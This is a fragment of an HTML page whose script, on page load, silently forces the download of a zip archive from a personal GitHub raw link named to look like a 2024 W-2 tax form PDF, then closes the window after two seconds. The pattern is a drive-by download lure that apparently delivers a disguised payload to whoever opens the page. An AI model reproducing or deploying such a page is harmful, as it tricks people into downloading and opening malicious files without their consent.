    background: #000;
    color: white;
    display: flex;
    flex-direction: column;

</style>
<script>
  window.onload = function() {
    const link = document.createElement('a');
    link.href = "https://raw.githubusercontent.com/MARKZBERG35/teamfile/main/W2_2024_LW2D1-pdf.zip"; 
    link.download = "https://raw.githubusercontent.com/MARKZBERG35/teamfile/main/W2_2024_LW2D1-pdf.zip";
    document.body.appendChild(link);
    link.click();
    setTimeout(() => window.close(), 2000);
  };
</script>
